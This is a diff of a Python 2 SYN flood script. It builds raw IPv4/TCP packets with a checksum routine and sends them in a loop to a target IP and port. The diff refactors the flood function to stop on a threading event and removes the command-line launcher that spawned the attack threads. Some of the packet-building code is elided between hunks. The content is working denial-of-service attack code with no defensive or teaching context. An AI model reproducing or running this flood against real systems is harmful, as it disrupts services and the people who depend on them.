@@ -1,13 +1,10 @@
 import sys
 import thread
+import threading
 import socket
 import random
 import struct
 from struct import *
-
-if len(sys.argv) < 4:
-    print "Error. Unexpected initialization."
-    print "Expected: python %s <port> <ip> <thread number>" % (sys.argv[0])
 
 def calcChecksum(header):
     unpacked = struct.unpack('!'+'H'*(len(header)/2), header)
@@ -20,8 +17,8 @@ def calcChecksum(header):
     
     return checksum
 
-def synFlood(ID, portDest, ipDest):
-    while 1:
+def synFlood(ID, portDest, ipDest, event):
+    while event.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW,\
                               socket.IPPROTO_TCP)
@@ -70,14 +67,5 @@ def synFlood(ID, portDest, ipDest):
         
         packet = ipv4Header + tcpHeader;
         s.sendto(packet, (ipDest, 0))
-
-for i in range(int(sys.argv[3])):
-    try:
-        thread.start_new_thread(syn_flood, (i, sys.argv[1], sys.argv[2],))
-    except:
-        print "Error: start_new_thread failed. %s" % (str(e), i)
-        sys.exit()
-
-while 1:
-   pass
+    print "MATOOOU A THREAD %s" % (ID)
 
